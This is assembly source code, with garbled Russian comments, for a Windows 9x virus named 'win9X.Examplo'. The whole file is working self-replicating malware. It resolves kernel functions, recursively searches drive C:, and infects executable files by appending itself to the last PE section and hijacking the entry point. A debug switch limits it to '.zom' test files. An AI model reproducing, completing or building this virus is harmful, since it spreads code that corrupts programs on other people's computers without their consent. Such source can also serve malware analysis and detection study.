
; ---------------------------------------------------------------------------

; win9X.Examplo virus

; ---------------------------------------------------------------------------

; ᮧ���� ���� � ���⥪�� ⥪�饣� �����, � ���� �� ࠡ�⠥�,
; ४��ᨢ�� ��� � ��ࠦ��� PE EXE 䠩�� � C:\
; ��⮤� ��ࠦ���� -- ���������� � ��᫥���� ᥪ樨

; � ��� ����祭�� ����୮� �����:
;   �⪮������� � DEBUG=1 � ��������
;   (��ࠦ����� ⮫쪮 .zom 䠩��,
;    ���� ⠪�� 䠩� �������� � ����� �� ��宦����� ��४��� � C:\)
; � ��� ����᪠ ��������� ࠡ�祩 ���ᨨ:
;   �⪮������� � DEBUG=0 � ��������

; ---------------------------------------------------------------------------

DEBUG                   equ     1       ; 0/1

; ---------------------------------------------------------------------------

include                 consts.inc      ; ��������, ����⠭��

; ---------------------------------------------------------------------------

                        p386            ; �ᥣ�� ��। model flat
                        model   flat    ; ���᪠� ������ (4 ���� � �� ⠪��)
                        locals  __      ; ������� ��⪨

                        .data           ; ᥪ�� ������ (�⥭��/������)

; ---------------------------------------------------------------------------

virstart:               ; ��砫� �����

                        db      13,10
                        db      'win9X.Examplo (x) 2000 MAZAFUK Records',13,10
                        db      13,10
virentry:
                        ; �뤥��� ���� ��� ࠡ���� ����� �����, � �����
                        sub     esp, virmemory

                        pusha           ; ��࠭��� �� ॣ�����

                        lea     ebp, [esp+32] ; edi = ����� ����� � �����

                        call    __seh_init      ; SEH,
                        mov     esp, [esp+8]    ; Self-Exception Handling,
                        jmp     __seh_error     ; ��⠭����� ��ࠡ��� �訡��
__seh_init:             push    dword ptr fs:[0];
                        mov     fs:[0], esp     ;

                        call    $+5     ; esi = virstart (⥪��� �����)
                        pop     esi
                        sub     esi, $-1-virstart

                        mov     edi, ebp  ; edi = ����� �����

                        mov     ecx, virsize  ; �����㥬 ᥡ� � ����
                        rep     movsb

                        ; ��뢠�� ����� �����
                        lea     eax, [ebp + in_new_addr-virstart]
                        call    eax

__seh_error:            pop     dword ptr fs:[0]  ; ���� ��ࠡ��� �訡��
                        pop     eax               ;

                        popa            ; ����⠭����� �� ॣ�����

                        db      0E9h    ; JMP �� �ਣ������� ��� �室�
oldentry                dd      0

                        jmp     back2loader  ; �㦭� ���� ���� ࠧ

; ---------------------------------------------------------------------------

in_new_addr:            ; ��������� ���� �������㥬�� �㭪権
                        ; (⠡��� ���म� imp_addr)
                        call    get_func_names
                        jc      __exit

                        ; ᮧ���� ����� "�������" ����

                        push    eax
                        push    esp ; 㪠��⥫� �� ����砥�� ThreadId
                        push    0   ; 䫠��
                        push    ebp ; ��ࠬ��� ��� = ��砫� �����
                        lea     eax, [ebp+newthread-virstart]
                        push    eax ; start address
                        push    0 ; stack size. 0==same as in primary thread
                        push    0
                        call    x_CreateThread-virstart[ebp]
                        pop     eax

__exit:                 retn

newthread:              pusha
                        mov     ebp, [esp+32+4] ; ��ࠬ��� == ��砫� �����

                        ; ��ࠧ��� 䠩�� � ⥪�饩 ��४�ਨ
                        ; EDI=ff_struc
                        ; EDX=���
                        sub     esp, size ff_struc
                        mov     edi, esp
                        push    '\:C'
                        mov     edx, esp        ; EDX='C:\',0
                        call    process_directory
                        add     esp, 4+size ff_struc

                        popa
                        retn

; ---------------------------------------------------------------------------

get_func_names:         ; ��������� ���� �������㥬�� �㭪権

                        lea     esi, imp_name-virstart[ebp]   ; ����� �������㥬�� �-権
                        lea     edi, imp_addr-virstart[ebp]   ; ���� �㭪権

__cycle:                call    get_proc_address ; ������� ���� �㭪樨
                        jz      __error
                        stosd                   ; ��࠭��� ����

__scan0:                lodsb                   ; ��᪨���� ���, �� ���
                        or      al, al          ;
                        jnz     __scan0         ;

                        cmp     [esi], al       ; �㫥��� ��� -
                        jne     __cycle         ; - ����� ⠡���� ����

__success:              clc
                        retn

__error:                stc
                        retn

; ---------------------------------------------------------------------------

; input:  ESI=��� �㭪樨 kernel'� (���ਬ�� 'CreateProcessA')
; action: ������ ⠡���� ��ᯮ�⮢ kernel'�
; output: ZF=1, EAX=0 (function not found)
;         ZF=0, EAX=function va

get_proc_address:       pusha

                        ; ��।����� ᫥������ ������� �� ���� ��୥��
                        ; �⮡� ����� �� �� win9X � win32
                        mov     ebx, 0BFF70000h         ; get_kernel_base

                        mov     ecx, [ebx].mz_neptr
                        mov     ecx, [ecx+ebx].pe_exporttablerva
                        add     ecx, ebx

                        xor     edi, edi        ; current index
__search_cycle:         lea     edx, [edi*4+ebx]
                        add     edx, [ecx].ex_namepointersrva
                        mov     edx, [edx]      ; name va
                        add     edx, ebx        ; +imagebase

                        pusha                   ; compare names
                        mov     edi, edx
__cmp_cycle:            cmp     byte ptr [edi], 0
                        je      __cmp_done
                        cmpsb
                        je      __cmp_cycle
__cmp_done:             popa

                        je      __name_found

                        inc     edi             ; index++
                        cmp     edi, [ecx].ex_numofnamepointers
                        jb      __search_cycle

__return_0:             xor     eax, eax        ; return 0
                        jmp     __return

__name_found:           mov     edx, [ecx].ex_ordinaltablerva
                        add     edx, ebx        ; +imagebase
                        movzx   edx, word ptr [edx+edi*2]; edx=current ordinal
                        mov     eax, [ecx].ex_addresstablerva
                        add     eax, ebx        ; +imagebase
                        mov     eax, [eax+edx*4]; eax=current address
                        add     eax, ebx        ; +imagebase

__return:               mov     [esp].popa_eax, eax  ; popa.eax
                        test    eax, eax

                        popa
                        retn

; ---------------------------------------------------------------------------

; subroutine: process_directory
; action:     1. find all files in the current directory
;             2. for each found directory (except "."/"..") recursive call;
;                for each found file call process_file
; input:      EDI=ff_struc
;             EDX=directory name
; output:     none

process_directory:      pusha
                        sub     esp, 1024       ; ���� ��� ��� ��४�ਨ

                        mov     esi, edx        ; � EDX ��� ����
                        mov     edi, esp        ; ᢮� ���� ��� ������ ���

__1:                    lodsb                   ; �����㥬 ��� � ᢮� ����
                        stosb
                        or      al, al
                        jnz     __1

                        dec     edi             ; ��� ������ �������� �� '\'
                        mov     al, '\'
                        cmp     [edi-1], al
                        je      __3
                        stosb
__3:
                        mov     ebx, edi        ; EBX = 㪠��⥫� �� 䠩�

                        mov     eax, '*.*'      ; �饬: ���\*.*
                        stosd

                        mov     edi, [esp+1024] ; ����⠭���� EDI

                        mov     eax, esp
                        push    edi             ; ff_struc, �㤥� ���������
                        push    eax             ; ��� 䠩��� ��� ���᪠
                        call    x_FindFirstFileA-virstart[ebp]

                        xchg    esi, eax        ; ESI = 奭�� ���᪠

                        cmp     esi, -1         ; �-���� �������?
                        je      __quit

__cycle:                pusha                   ; ������塞 ��� 䠩�� � ���
                        lea     esi, [edi].ff_fullname
                        mov     edi, ebx
__strcpy:               lodsb
                        stosb
                        or      al, al
                        jnz     __strcpy
                        popa

                        mov     edx, esp        ; EDX = ������ ��������� ���

                        test    byte ptr [edi].ff_attr, 16  ; ���?
                        jnz     __dir

                        call    process_file    ; ��ࠡ���� 䠩� (EDX,EDI)

                        jmp     __next
__dir:
                        lea     eax, [edi].ff_fullname
                        cmp     byte ptr [eax], '.'    ; skip ./../etc.
                        je      __next

                        call    process_directory       ; ४��ᨢ�� �맮�

__next:                 push    edi             ; ff_struc, �㤥� ���������
                        push    esi             ; 奭�� ���᪠
                        call    x_FindNextFileA-virstart[ebp]

                        or      eax, eax        ; ���� 䠩�?
                        jnz     __cycle

                        push    esi             ; ESI = 奭�� ���᪠
                        call    x_FindClose-virstart[ebp]

__quit:                 add     esp, 1024
                        popa
                        retn

; ---------------------------------------------------------------------------

; input: EDX=full filename
;        EDI=ff_struc

process_file:           pusha

                        ; ����稬 ���७�� 䠩��
                        mov     esi, edx
__scan0:                lodsb
                        or      al, al
                        jne     __scan0
                        mov     eax, [esi-5]
                        or      eax, 20202000h
                        ; �஢�ਬ ���७�� -- �ᯮ��塞�� �� ���

IF      DEBUG EQ 1
                        cmp     eax, 'moz.'   ; .zom
                        je      __infect
ELSE
                        cmp     eax, 'exe.'   ; .exe
                        je      __infect
ENDIF

                        popa
                        retn

__infect:               call    infect_file

                        popa
                        retn

; ---------------------------------------------------------------------------

; input: EDX=fullname
;        EDI=ff_struc
;        EAX=extension

infect_file:            pusha

                        mov     esi, [edi].ff_size      ; ESI=����� 䠩��

                        ; ��࠭�稬 ���ᨬ����� ����� 䠩��
                        cmp     esi, 256*1024
                        jae     __exit

                        ; ��஥� 䠩�
                        push    0
                        push    80h     ; FILE_ATTRIBUTE_NORMAL
                        push    3       ; 3=OPEN_EXISTING  2=CREATE_ALWAYS
                        push    0
                        push    1+2     ; 1=FILE_SHARE_READ 2=FILE_SHARE_WRITE
                        push    080000000h+40000000h ; GENERIC_READ + GENERIC_WRITE
                        push    edx     ; EDX=��� 䠩��
                        call    x_CreateFileA-virstart[ebp]
                        cmp     eax, -1 ; �訡��?
                        je      __exit
                        xchg    ebx, eax

                        ; �뤥��� ��娫� ��᮪ �����
                        lea     eax, [esi+65536]        ; �� 64k �����
                        push    eax                     ; size
                        push    0                       ; 0=GMEM_FIXED
                        call    x_GlobalAlloc-virstart[ebp]
                        xchg    edi, eax                ; EDI=䠩� � �����

                        ; ��⠥� ���� 䠩� � ������
                        push    0
                        push    esp                     ; bytesread
                        push    esi                     ; size
                        push    edi                     ; buf
                        push    ebx                     ; handle
                        call    x_ReadFile-virstart[ebp]

                        ; ��ࠧ�� 䠩� � �����
                        call    infect_real
                        jc      __close

                        push    0                       ; FILE_BEGIN,�� ��砫�
                        push    0
                        push    0                       ; ������=0
                        push    ebx                     ; 奭��
                        call    x_SetFilePointer-virstart[ebp]

                        ; ����襬 ��ࠦ���� 䠩� ���⭮ �� ���
                        push    0
                        push    esp                     ; bytesread
                        push    esi                     ; size
                        push    edi                     ; buf
                        push    ebx                     ; handle
                        call    x_WriteFile-virstart[ebp]

__close:                ; �᢮����� ������
                        push    esi
                        call    x_GlobalFree-virstart[ebp]

                        ; ���஥� 䠩�
                        push    ebx     ; 奭�� 䠩��
                        call    x_CloseHandle-virstart[ebp]

__exit:                 popa
                        retn

; ---------------------------------------------------------------------------

; ��楤�� ��ࠦ��� 䠩�, 楫���� ��⠭�� � ������

; input:  EDI=���� � 䠩��� (�� 64k ����� 祬 ESI)
;         ESI=����� 䠩��
; output: CF==0 -- 䠩� ��ࠦ��, ESI=����� �����
;         CF==1 -- �訡��

infect_real:            pusha

                        cmp     [edi].mz_id, 'ZM'   ; check if MZ file
                        jne     __error

                        mov     ebx, edi
                        add     ebx, [ebx].mz_neptr ; EBX = PE header

                        cmp     [ebx].pe_id, 'EP'   ; check if PE file
                        jne     __error

                        test    [ebx].pe_exeflags, 2000h ; dll ?
                        jnz     __error

                        cmp     [ebx].pe_userminor, 'i' ; 㦥 ����஢��?
                        je      __error
                        mov     [ebx].pe_userminor, 'i'

                        ; EAX = ࠧ��� PE ���������
                        movzx   eax, [ebx].pe_ntheadersize
                        add     eax, 18h

                        ; EAX = ObjectTable
                        add     eax, ebx

                        ; ecx = (�᫮_ᥪ権 - 1) * 28h
                        movzx   ecx, [ebx].pe_numofobjects
                        dec     ecx
                        imul    ecx, size oe_struc

                        add     ecx, eax ; ECX=��᫥���� ������� objecttable

                        ; ��஢�塞  �������� � ����㠫��� �����
                        ; ��᫥���� ᥪ樨 �� filealign � objectalign

                        mov     eax, [ebx].pe_filealign
                        dec     eax
                        add     [ecx].oe_phys_size, eax
                        not     eax
                        and     [ecx].oe_phys_size, eax

                        mov     eax, [ebx].pe_objectalign
                        dec     eax
                        add     [ecx].oe_virt_size, eax
                        not     eax
                        and     [ecx].oe_virt_size, eax

                        ; ���� ���૥�?
                        mov     eax, [ecx].oe_phys_offs
                        add     eax, [ecx].oe_phys_size
                        cmp     eax, esi                ; ESI=����� 䠩��
                        jne     __error

                        ; ��᫥���� ᥪ��:
                        ; 䨧. ����� �� ������ ���� ����� ����㠫쭮�
                        mov     eax, [ecx].oe_phys_size
                        mov     edx, [ecx].oe_virt_size
                        cmp     eax, edx
                        ja      __error
                        ; � �� ���� �� ��� �� ������ ���� �㫥���
                        or      eax, edx
                        jz      __error

                        ; ��࠭�� �ਣ������� ��� �室�

                        mov     eax, [ecx].oe_virt_rva
                        add     eax, [ecx].oe_phys_size
                        add     eax, oldentry+4-virstart
                        sub     eax, [ebx].pe_entrypointrva
                        neg     eax
                        mov     oldentry-virstart[ebp], eax

                        ; ��⠭���� ����� ��� �室�
                        mov     eax, [ecx].oe_virt_rva
                        add     eax, [ecx].oe_phys_size
                        add     eax, virentry-virstart
                        mov     [ebx].pe_entrypointrva, eax

                        ; �����㥬 ����� � 䠩� (� ����� 䠩�� � �����)
                        pusha
                        add     edi, esi        ; ==buf+bufsize
                        mov     esi, ebp        ; ==virstart
                        mov     ecx, virsize
                        cld
                        rep     movsb
                        popa

                        ; ���᫨� ����� �����, ��஢������ �� objectalign
                        mov     edx, virsize
                        mov     eax, [ebx].pe_objectalign
                        dec     eax
                        add     edx, eax
                        not     eax
                        and     edx, eax

                        ; �ࠢ�� PE-��������� � ������ � ��᫥���� ᥪ樨

                        add     [ebx].pe_imagesize, edx
                        add     [ebx].pe_sizeofcode, edx

                        add     [ecx].oe_virt_size, edx

                        ; ���᫨� ����� �����, ��஢�ﭭ�� �� filealign

                        mov     edx, virsize
                        mov     eax, [ebx].pe_filealign
                        dec     eax
                        add     edx, eax
                        not     eax
                        and     edx, eax

                        ; �ࠢ�� ������ � ��᫥���� ᥪ樨
                        add     [ecx].oe_phys_size, edx

                        ; 㢥��稬 ����� 䠩��
                        add     [esp].popa_esi, edx

__success:              clc
                        popa
                        retn

__error:                stc
                        popa
                        retn

; ---------------------------------------------------------------------------

imp_name:               ; ����� �������㥬�� ����ᮬ �㭪権
                        db      'FindFirstFileA',0
                        db      'FindNextFileA',0
                        db      'FindClose',0
                        ;;
                        db      'CreateFileA',0
                        db      'SetFilePointer',0
                        db      'ReadFile',0
                        db      'WriteFile',0
                        db      'CloseHandle',0
                        ;;
                        db      'GlobalAlloc',0
                        db      'GlobalFree',0
                        ;;
                        db      'CreateThread',0
                        db      0

; ---------------------------------------------------------------------------

                        align   4
virsize                 equ     $-virstart      ; ����� �����

; ---------------------------------------------------------------------------

imp_addr:               ; ���� �������㥬�� ����ᮬ �㭪権
x_FindFirstFileA        dd      ?
x_FindNextFileA         dd      ?
x_FindClose             dd      ?
                        ;;
x_CreateFileA           dd      ?
x_SetFilePointer        dd      ?
x_ReadFile              dd      ?
x_WriteFile             dd      ?
x_CloseHandle           dd      ?
                        ;;
x_GlobalAlloc           dd      ?
x_GlobalFree            dd      ?
                        ;;
x_CreateThread          dd      ?

; ---------------------------------------------------------------------------

                        align   4
virmemory               equ     $-virstart      ; ����� �����

; ---------------------------------------------------------------------------

                        .code           ; ᥪ�� ���� (⮫쪮 �⥭��)
loader:
                        call    virentry
back2loader:
                        push    5*1000           ; ��㧠 5 ᥪ㭤
                        extern  Sleep:PROC
                        call    Sleep

                        push    -1               ; exitcode
                        extern  ExitProcess:PROC
                        call    ExitProcess      ; ��室 �� �ணࠬ��

                        end     loader  ; loader -- �窠 �室� � �ணࠬ��

; ---------------------------------------------------------------------------
